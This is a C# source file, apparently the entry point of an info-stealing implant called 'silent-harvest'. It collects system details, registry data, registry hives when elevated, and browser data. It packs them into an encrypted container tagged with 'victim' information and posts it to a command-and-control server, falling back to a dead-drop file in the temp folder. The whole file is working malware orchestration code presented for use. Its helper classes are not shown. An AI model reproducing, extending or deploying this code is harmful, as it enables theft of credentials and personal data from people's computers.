// silent-harvest implant — entry point / orchestration
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace SilentHarvest
{
    public static class Program
    {
        private static string c2 = Cfg.C2;
        private static string outFile = null;
        private static string psk = Cfg.PSK;
        private static string only = null;

        private static int Main(string[] argv)
        {
            for (int i = 0; i < argv.Length; i++)
            {
                string a = argv[i].ToLowerInvariant();
                if (a == "--c2" && i + 1 < argv.Length) c2 = argv[++i];
                else if (a == "--out" && i + 1 < argv.Length) outFile = argv[++i];
                else if (a == "--psk" && i + 1 < argv.Length) psk = argv[++i];
                else if (a == "--only" && i + 1 < argv.Length) only = argv[++i].ToLowerInvariant();
                else if (a == "--wait" && i + 1 < argv.Length)
                {
                    int ms;
                    if (int.TryParse(argv[++i], out ms)) System.Threading.Thread.Sleep(ms);
                }
            }

            bool elevated = Stages.IsElevated();
            bool backup = Stages.EnableBackupPrivilege();
            Util.Log("host={0} user={1} elevated={2} SeBackup={3}",
                Environment.MachineName, Environment.UserName, elevated, backup);

            List<Part> parts = new List<Part>();
            parts.Add(new Part("sysinfo.json",
                Encoding.UTF8.GetBytes(Stages.SysinfoJson(elevated, backup)), null));

            bool wantReg = only == null || only.Contains("reg");
            bool wantHives = only == null || only.Contains("hive");
            bool wantBrowsers = only == null || only.Contains("brow");

            if (wantReg)
            {
                string s = Stages.RegistryStage(parts);
                Util.Log("registry stage: {0}", s);
            }
            if (wantHives && elevated)
            {
                string s = Stages.HiveStage(parts);
                Util.Log("hive stage: {0}", s);
            }
            else if (wantHives)
            {
                Util.Log("hive stage: skipped (not elevated)");
            }
            if (wantBrowsers)
            {
                string s = Stages.BrowserStage(parts);
                Util.Log("browser stage: {0}", s);
            }

            if (parts.Count <= 1)
            {
                Util.Log("nothing collected, aborting");
                return 1;
            }

            // ---- assemble container ----
            long total = 0;
            foreach (Part p in parts) total += p.Data.Length;
            byte[] blobAll = new byte[total];
            long off = 0;
            StringBuilder partsJson = new StringBuilder();
            bool first = true;
            foreach (Part p in parts)
            {
                Buffer.BlockCopy(p.Data, 0, blobAll, (int)off, p.Data.Length);
                if (!first) partsJson.Append(',');
                first = false;
                partsJson.Append("{\"name\":\"").Append(Util.EscapeJson(p.Name))
                          .Append("\",\"off\":").Append(off)
                          .Append(",\"len\":").Append(p.Data.Length)
                          .Append(",\"meta\":").Append(p.MetaJson).Append('}');
                off += p.Data.Length;
            }

            StringBuilder manifest = new StringBuilder();
            manifest.Append("{\"v\":1,\"victim\":").Append(Stages.SysinfoJson(elevated, backup))
                    .Append(",\"parts\":[").Append(partsJson).Append("]}");

            byte[] container;
            try
            {
                container = Crypto.BuildContainer(manifest.ToString(), blobAll,
                    Encoding.UTF8.GetBytes(psk));
            }
            catch (Exception e)
            {
                Util.Log("crypto failure: {0}", e.Message);
                return 3;
            }
            Util.Log("container: {0} bytes from {1} parts", container.Length, parts.Count);

            bool ok;
            if (outFile != null)
                ok = Exfil.WriteOut(container, outFile);
            else
                ok = Exfil.Post(container, c2);

            if (!ok && outFile == null)
            {
                // fall back to a dead-drop file next to the exe if the C2 is down
                try
                {
                    string alt = Path.Combine(Path.GetTempPath(),
                        "sh_" + Environment.MachineName + "_" +
                        ((long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds) + ".bin");
                    Exfil.WriteOut(container, alt);
                    Util.Log("C2 unreachable; container dropped at {0}", alt);
                }
                catch { }
                return 2;
            }
            return ok ? 0 : 2;
        }
    }
}
